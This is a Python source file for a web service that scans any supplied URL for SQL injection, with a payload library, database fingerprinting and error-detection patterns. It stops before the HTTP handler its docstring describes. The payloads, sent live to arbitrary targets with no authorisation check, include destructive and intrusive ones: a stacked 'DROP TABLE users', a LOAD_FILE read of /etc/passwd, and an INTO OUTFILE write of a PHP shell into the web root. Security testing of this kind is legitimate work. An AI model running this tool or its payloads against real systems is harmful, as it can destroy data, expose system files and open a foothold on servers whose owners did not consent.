#!/usr/bin/env python3
"""
SQLMap-style SQL Injection Detection Backend
Pure Python stdlib — no pip installs required

Usage:
    python sqlmap_server.py

Endpoints:
    GET /health                       — health check
    GET /scan?url=...&level=1|2|3     — SQL injection scan
        url    : target URL with query params e.g. https://site.com/page?id=1
        params : (optional) comma-separated param names to test
        level  : 1=fast/10 payloads  2=medium/20  3=full/all  (default: 2)
"""

import json
import socket
import urllib.request
import urllib.error
import concurrent.futures
import time
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode


# ── Config ─────────────────────────────────────────────────────────────────────
import os
PORT = int(os.environ.get("PORT", 8768))
REQUEST_TIMEOUT = 8
MAX_WORKERS     = 20
USER_AGENT      = "Mozilla/5.0 (compatible; SecurityScanner/1.0)"
# ──────────────────────────────────────────────────────────────────────────────


# ── Payload library ────────────────────────────────────────────────────────────
# Each entry: (payload_string, injection_type, human_description)

ALL_PAYLOADS = [
    # Error-based
    ("'",                                                          "error_based",   "Single quote syntax probe"),
    ("''",                                                         "error_based",   "Escaped quote probe"),
    ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",               "error_based",   "MySQL EXTRACTVALUE error"),
    ("1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
                                                                   "error_based",   "MySQL GROUP BY error injection"),
    ("1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                                                                   "error_based",   "MSSQL CONVERT type error"),
    # Boolean-blind
    ("1' AND '1'='1",                                              "boolean_blind", "String always-true condition"),
    ("1' AND '1'='2",                                              "boolean_blind", "String always-false condition"),
    ("1 AND 1=1",                                                  "boolean_blind", "Integer always-true"),
    ("1 AND 1=2",                                                  "boolean_blind", "Integer always-false"),
    ("' OR '1'='1",                                                "boolean_blind", "OR always-true bypass"),
    ("' OR 1=1--",                                                 "boolean_blind", "Classic OR bypass with comment"),
    ("admin'--",                                                   "boolean_blind", "Comment termination"),
    ("admin'#",                                                    "boolean_blind", "MySQL hash comment termination"),
    ("') OR ('1'='1",                                              "boolean_blind", "Parenthesis OR bypass"),
    # UNION-based
    ("1 UNION SELECT NULL--",                                      "union_based",   "UNION 1-col NULL probe"),
    ("1 UNION SELECT NULL,NULL--",                                 "union_based",   "UNION 2-col NULL probe"),
    ("1 UNION SELECT NULL,NULL,NULL--",                            "union_based",   "UNION 3-col NULL probe"),
    ("1 UNION SELECT table_name,NULL FROM information_schema.tables--",
                                                                   "union_based",   "UNION table name extraction"),
    # Time-based
    ("1 AND SLEEP(3)--",                                           "time_based",    "MySQL SLEEP 3s"),
    ("1' AND SLEEP(3)--",                                          "time_based",    "MySQL string SLEEP 3s"),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",                "time_based",    "MySQL subquery SLEEP"),
    ("1; WAITFOR DELAY '0:0:3'--",                                 "time_based",    "MSSQL WAITFOR 3s"),
    ("1'; WAITFOR DELAY '0:0:3'--",                                "time_based",    "MSSQL string WAITFOR 3s"),
    ("1; SELECT pg_sleep(3)--",                                    "time_based",    "PostgreSQL pg_sleep 3s"),
    # Stacked / OOB
    ("1; DROP TABLE users--",                                      "stacked",       "Stacked DROP TABLE"),
    ("1 AND LOAD_FILE('/etc/passwd')",                             "out_of_band",   "MySQL file read attempt"),
    ("1 INTO OUTFILE '/var/www/html/shell.php'",                   "out_of_band",   "MySQL file write attempt"),
]

# DB engine fingerprinting from error text
DB_SIGNATURES = {
    "MySQL":      ["mysql", "you have an error in your sql syntax", "warning: mysql", "mysqli", "mysqlnd"],
    "PostgreSQL": ["postgresql", "pg_query", "pg_exec", "unterminated quoted string", "pg_sleep"],
    "MSSQL":      ["microsoft sql server", "unclosed quotation mark", "odbc sql server", "mssql_", "sqlsrv"],
    "Oracle":     ["ora-0", "ora-1", "oracle error", "quoted string not properly terminated"],
    "SQLite":     ["sqlite", "sqlite_query", "sqliteexception", "sqlite3::"],
    "MariaDB":    ["mariadb", "maria db"],
}

# Regex patterns that indicate a SQL error leaked in the response
ERROR_PATTERNS = [
    r"sql syntax",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"ora-\d{3,}",
    r"microsoft ole db",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\s*\(",
    r"supplied argument is not a valid (mysql|pg)",
    r"warning.*?mysql",
    r"mysqli?_",
    r"com\.mysql\.jdbc",
    r"sqlexception",
    r"sqlite_",
    r"sqlite3::",
    r"syntax error.*?sql",
    r"incorrect syntax near",
    r"unexpected end of sql",
    r"division by zero",
    r"unknown column",
    r"table.*?doesn.t exist",
]


# ── HTTP helpers ───────────────────────────────────────────────────────────────

def http_get(url: str, timeout: int = REQUEST_TIMEOUT) -> tuple[int, str, float]:
    """GET request. Returns (status, body, elapsed_sec)."""
    start = time.monotonic()
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": USER_AGENT, "Accept": "*/*", "Connection": "close"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body   = resp.read(65536).decode("utf-8", errors="replace")
            status = resp.status
    except urllib.error.HTTPError as e:
        try:
            body = e.read(65536).decode("utf-8", errors="replace")
        except Exception:
            body = ""
        status = e.code
    except Exception:
        return 0, "", time.monotonic() - start
    return status, body, time.monotonic() - start


def inject(base_url: str, param: str, payload: str) -> str:
    """Return URL with payload substituted into param."""
    p  = urlparse(base_url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    return p._replace(query=urlencode(qs, doseq=True)).geturl()


# ── Detection helpers ──────────────────────────────────────────────────────────

def detect_db(body: str) -> str:
    b = body.lower()
    for db, sigs in DB_SIGNATURES.items():
        if any(s in b for s in sigs):
            return db
    return "Unknown"


def has_error(body: str) -> bool:
    b = body.lower()
    return any(re.search(pat, b) for pat in ERROR_PATTERNS)


def boolean_diff(base: str, true_r: str, false_r: str) -> bool:
    """True if false_r is meaningfully shorter/different than base while true_r matches."""
    if not base or not true_r or not false_r:
        return False
    bl, tl, fl = len(base), len(true_r), len(false_r)
    if bl == 0:
        return False
    return (abs(bl - fl) / bl) > 0.15 and (abs(bl - tl) / bl) < 0.10


# ── Per-parameter test ─────────────────────────────────────────────────────────

def test_param(base_url: str, param: str, baseline: str, payloads: list) -> list[dict]:
    """Run all payloads against one parameter. Returns list of findings."""
    findings: list[dict] = []
    seen_types: set[str] = set()

    # Pre-fetch boolean baselines
    _, true_body,  _ = http_get(inject(base_url, param, "1 AND 1=1"))
    _, false_body, _ = http_get(inject(base_url, param, "1 AND 1=2"))

    for payload, inj_type, description in payloads:
        if inj_type in seen_types and inj_type not in ("union_based",):
            continue

        url_with_payload          = inject(base_url, param, payload)
        status, body, elapsed     = http_get(url_with_payload)

        confirmed = False
        evidence  = ""

        if inj_type == "error_based":
            if has_error(body):
                confirmed = True
                db        = detect_db(body)
                evidence  = f"SQL error leaked in response — DB fingerprint: {db}"

        elif inj_type == "boolean_blind":
            if boolean_diff(baseline, true_body, false_body):
                confirmed = True
                evidence  = "Response body differs significantly between true/false conditions"

        elif inj_type == "time_based":
            if elapsed >= 2.5:
                confirmed = True
                evidence  = f"Response delayed {elapsed:.1f}s — matches expected sleep duration"

        elif inj_type == "union_based":
            if has_error(body) or (body and len(body) > len(baseline) * 1.25):
                confirmed = True
                evidence  = "UNION query changed response length or triggered error"

        elif inj_type in ("stacked", "out_of_band"):
            if has_error(body):
                confirmed = True
                evidence  = "Payload triggered an error response"

        if confirmed:
            seen_types.add(inj_type)
            findings.append({
                "parameter":      param,
                "payload":        payload,
                "injection_type": inj_type,
                "description":    description,
                "evidence":       evidence,
                "status_code":    status,
                "response_time":  round(elapsed, 2),
                "injected_url":   url_with_payload,
                "severity":       _sev(inj_type),
                "risk":           _risk(inj_type),
            })

    return findings


def _sev(t: str) -> str:
    return {"error_based": "high", "boolean_blind": "high", "time_based": "medium",
            "union_based": "critical", "stacked": "critical", "out_of_band": "critical"}.get(t, "medium")


def _risk(t: str) -> str:
    return {
        "error_based":   "Data extraction possible via DB error messages",
        "boolean_blind": "Data extraction via true/false response comparison",
        "time_based":    "Blind injection — data extraction via timing side-channel",
        "union_based":   "Direct data extraction via UNION SELECT",
        "stacked":       "Full DB control — arbitrary INSERT/UPDATE/DROP possible",
        "out_of_band":   "Server filesystem read/write may be possible",
    }.get(t, "Unknown risk")


# ── Main scan ──────────────────────────────────────────────────────────────────

def run_scan(url: str, param_names: list[str] | None = None, level: int = 2) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urlparse(url)
    qs     = parse_qs(parsed.query, keep_blank_values=True)

    params = (
        [p for p in param_names if p in qs] or list(qs.keys())
        if param_names else list(qs.keys())
    )

    if not params:
        return {"error": "No query parameters found. Include params in the URL e.g. ?id=1&user=admin"}

    hostname = parsed.hostname or ""
    try:
        socket.setdefaulttimeout(REQUEST_TIMEOUT)
        socket.gethostbyname(hostname)
    except Exception as e:
        return {"error": f"Cannot resolve host '{hostname}': {e}"}

    base_status, baseline, base_time = http_get(url)
    if base_status == 0:
        return {"error": f"Target unreachable: {url}"}

    # Select payload subset by level — no global mutation
    if level >= 3:
        payloads = ALL_PAYLOADS
    elif level == 2:
        payloads = ALL_PAYLOADS[:20]
    else:
        payloads = ALL_PAYLOADS[:10]

    all_findings: list[dict] = []
    tested_params: list[dict] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(params), MAX_WORKERS)) as ex:
        futures = {ex.submit(test_param, url, p, baseline, payloads): p for p in params}
        for future in concurrent.futures.as_completed(futures):
            p = futures[future]
            try:
                findings = future.result(timeout=120)
            except Exception:
                findings = []
            tested_params.append({"name": p, "vulnerable": bool(findings), "finding_count": len(findings)})
            all_findings.extend(findings)

    # Deduplicate by (param, injection_type)
    seen, unique = set(), []
    for f in all_findings:
        k = (f["parameter"], f["injection_type"])
        if k not in seen:
            seen.add(k)
            unique.append(f)

    # DB detection from findings
    db_detected = "Unknown"
    for f in unique:
        if "DB fingerprint:" in f.get("evidence", ""):
            db_detected = f["evidence"].split("DB fingerprint:")[-1].strip()
            break

    unique.sort(key=lambda x: {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x["severity"], 4))

    return {
        "target":          url,
        "hostname":        hostname,
        "baseline_status": base_status,
        "baseline_time":   round(base_time, 3),
        "db_detected":     db_detected,
        "params_tested":   tested_params,
        "total_payloads":  len(payloads) * len(params),
        "total_findings":  len(unique),
        "vulnerable":      len(unique) > 0,
        "findings":        unique,
    }


# ── HTTP handler ───────────────────────────────────────────────────────────────

